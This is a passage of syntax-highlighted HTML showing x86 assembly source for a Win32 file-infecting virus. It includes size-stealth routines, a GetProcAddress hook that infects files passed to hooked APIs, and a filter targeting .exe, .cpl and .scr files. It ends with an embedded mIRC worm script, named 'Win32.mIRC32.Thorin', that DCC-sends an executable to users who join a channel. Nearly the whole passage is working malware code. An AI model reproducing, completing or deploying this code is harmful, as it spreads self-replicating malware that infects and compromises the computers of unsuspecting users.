    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Info4Stealth</span><span class="sc0">                    </span><span class="sc1">; Retrieve info for possible</span><span class="sc0">
                        </span><span class="sc1">; stealth...</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">FN_AvoidInfekt</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">FN_FS</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">WFD_nFileSizeLow</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">WIN32_FIND_DATA</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">                       </span><span class="sc1">; Size Stealth, dude!</span><span class="sc0">

</span><span class="sc5">FN_AvoidInfekt</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">popfd</span><span class="sc0">                                   </span><span class="sc1">; Restore flags &amp; regs</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">

</span><span class="sc5">FN_GoAway</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">; Return to caller</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">FNRetAddress</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">HookGetProcAddress</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">                                  </span><span class="sc1">; Save all the registers</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetDeltaOffset</span><span class="sc0">                  </span><span class="sc1">; EBP = Delta Offset</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; EAX = Base address of module</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">kernel</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Is EAX=K32?</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">OriginalGPA</span><span class="sc0">                     </span><span class="sc1">; If not, it's not our problem</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">esp.PUSHAD_EAX</span><span class="sc4">],</span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">HGPA_RetAddress</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Put ret address in a safe place</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">_GetProcAddress</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; Call original API</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; Fail? Duh!</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">HGPA_SeeYa</span><span class="sc0">

    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                         </span><span class="sc1">; EBX = Address of function</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetDeltaOffset</span><span class="sc0">                  </span><span class="sc1">; EBP = Delta offset</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">n_HookedAPIs</span><span class="sc0">                </span><span class="sc1">; ECX = Number of hooked apis</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@HookedOffsetz</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; ESI = Ptr to array of API</span><span class="sc0">
                        </span><span class="sc1">; addresses</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                         </span><span class="sc1">; EDX = Counter (set to 0)</span><span class="sc0">
</span><span class="sc5">HGPA_IsHookableAPI?</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">                                   </span><span class="sc1">; EAX = API from array</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; Is equal to requested address?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">HGPA_IndeedItIs</span><span class="sc0">                 </span><span class="sc1">; If yes, it's interesting 4 us</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">; Increase counter</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">HGPA_IsHookableAPI?</span><span class="sc0">             </span><span class="sc1">; Search loop</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">OriginalGPAx</span><span class="sc0">

</span><span class="sc5">HGPA_IndeedItIs</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@Hookz</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; EDI = Ptr to hooked API strings</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                         </span><span class="sc1">; EBX = New counter</span><span class="sc0">
</span><span class="sc5">HGPA_AndWhatAPI?</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                         </span><span class="sc1">; We want EBX = EDX</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">HGPA_ThisAPI</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                           </span><span class="sc1">; Travel trough the Hooks</span><span class="sc0">
    </span><span class="sc6">scasb</span><span class="sc0">                                   </span><span class="sc1">; structure</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">HGPA_AndWhatAPI?</span><span class="sc0">
</span><span class="sc5">HGPA_ThisAPI</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                           </span><span class="sc1">; EDI = Points to requested</span><span class="sc0">
    </span><span class="sc6">scasb</span><span class="sc0">                                   </span><span class="sc1">; api string</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">; Get its offset</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">                         </span><span class="sc1">; Adjust it to delta</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">esp.PUSHAD_EAX</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">

</span><span class="sc5">HGPA_SeeYa</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">HGPA_RetAddress</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">OriginalGPAx</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">esp.PUSHAD_EAX</span><span class="sc4">],</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">HGPA_RetAddress</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">_GetProcAddress</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">OriginalGPA</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">esp.PUSHAD_EAX</span><span class="sc4">],</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">_GetProcAddress</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">; Hooked "standard" APIs handler</span><span class="sc0">
</span><span class="sc1">; ===========================================================================</span><span class="sc0">

</span><span class="sc5">DoHookStuff</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">pushfd</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetDeltaOffset</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2Ch</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; Get filename to infect</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Check4ValidFile</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">ErrorDoHookStuff</span><span class="sc0">
</span><span class="sc5">InfectWithHookStuff</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_Infection</span><span class="sc0">
</span><span class="sc5">ErrorDoHookStuff</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">popfd</span><span class="sc0">                                   </span><span class="sc1">; Preserve all as if nothing</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">                                   </span><span class="sc1">; happened :)</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetDeltaOffset</span><span class="sc0">                  </span><span class="sc1">; Get delta offset </span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">; Retrieve information for size-stealth</span><span class="sc0">
</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;       ESI = Pointer to file name</span><span class="sc0">
</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;       EAX = Old Size (Stored at PE Header+44h)</span><span class="sc0">
</span><span class="sc1">;       CF  = Set to 1 if error (file not infected, I/O, etc)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">Info4Stealth</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CoolFlag</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">     </span><span class="sc1">; Flag to 0</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">OpenFile</span><span class="sc0">                        </span><span class="sc1">; Open File</span><span class="sc0">
    </span><span class="sc5">cmp_</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">I4S_Error</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileHandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Store its handler</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">                       </span><span class="sc1">; Get file's size</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_GetFileSize</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">; Create its mapping</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CreateMap</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc5">cmpz_</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">I4S_Error_CloseFileHnd</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MapHandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">; Save handler</span><span class="sc0">
    
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MapFile</span><span class="sc0">                         </span><span class="sc1">; Create a mapping view</span><span class="sc0">
    </span><span class="sc5">cmpz_</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">I4S_Error_CloseMapHnd</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MapAddress</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Store mapping address</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc3">"EP"</span><span class="sc0">            </span><span class="sc1">; Is it PE?</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">I4S_Error_UnMapHnd</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">orig_size</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get original's file size</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OldSize</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; And put it in a temp place</span><span class="sc0">

    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CoolFlag</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Set flag to 1</span><span class="sc0">

</span><span class="sc5">I4S_Error_UnMapHnd</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MapAddress</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Close map view of file</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_UnmapViewOfFile</span><span class="sc0">

</span><span class="sc5">I4S_Error_CloseMapHnd</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MapHandle</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Close map handle</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_CloseHandle</span><span class="sc0">

</span><span class="sc5">I4S_Error_CloseFileHnd</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileHandle</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Close file handle</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_CloseHandle</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CoolFlag</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">     </span><span class="sc1">; Were we able to open? If yes,</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">I4S_Error</span><span class="sc0">                       </span><span class="sc1">; leave stack clear...</span><span class="sc0">

</span><span class="sc5">I4S_Successful</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">OldSize</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">I4S_Error</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">stc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">; Check if file infection is reliable </span><span class="sc0">
</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;       ESI = Pointer to file name</span><span class="sc0">
</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;       CF  = Set to 1 if it's reliable, to 0 if it isn't</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">Check4ValidFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                           </span><span class="sc1">; Find NULL? Shit...</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">C4VF_Error</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc3">"."</span><span class="sc0">                          </span><span class="sc1">; Dot found? Interesting...</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Check4ValidFile</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">                                   </span><span class="sc1">; Put extension in EAX</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">20202020h</span><span class="sc0">                   </span><span class="sc1">; Make string locase</span><span class="sc0">
    </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc3">"exe."</span><span class="sc0">                  </span><span class="sc1">; Is it an EXE? Infect!!!</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">C4VF_Successful</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc3">"lpc."</span><span class="sc0">                  </span><span class="sc1">; Is it a CPL? Infect!!!</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">C4VF_Successful</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc3">"rcs."</span><span class="sc0">                  </span><span class="sc1">; Is is a SCR? Infect!!!</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">C4VF_Error</span><span class="sc0">
</span><span class="sc5">C4VF_Successful</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">C4VF_Error</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">stc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">; Check if handle was stored previously</span><span class="sc0">
</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;       EAX = Handle</span><span class="sc0">
</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;       EAX = WFD Offset of given handle</span><span class="sc0">
</span><span class="sc1">;       EDX = Places what it occupies in WFD_Handles structure</span><span class="sc0">
</span><span class="sc1">;       CF  = Set to 1 if it's found, to 0 if it wasn't</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">Check4ValidHandle</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">WFD_HndInMem</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">C4VH_l00p</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">n_Handles</span><span class="sc0">                   </span><span class="sc1">; Over limits? Shit...</span><span class="sc0">
    </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">C4VH_Error</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">; EAX = a handler stored in</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">C4VH_Successful</span><span class="sc0">                 </span><span class="sc1">; table</span><span class="sc0">

    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">; Increase counter</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">C4VH_l00p</span><span class="sc0">
</span><span class="sc5">C4VH_Successful</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; EAX = WFD Offset</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">C4VH_Error</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">stc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">; mIRC worm</span><span class="sc0">
</span><span class="sc1">; ===========================================================================</span><span class="sc0">

</span><span class="sc5">mIRCWorm</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"[script]"</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"n0=ON 1:JOIN:#: {/if ($nick==$me) { halt }"</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"n1=/dcc send $nick c:\pr0n.exe"</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"n2=}"</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"n3=ON 1:TEXT:*pr0n*:#:/quit Win32.mIRC32.Thorin 1.00"</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
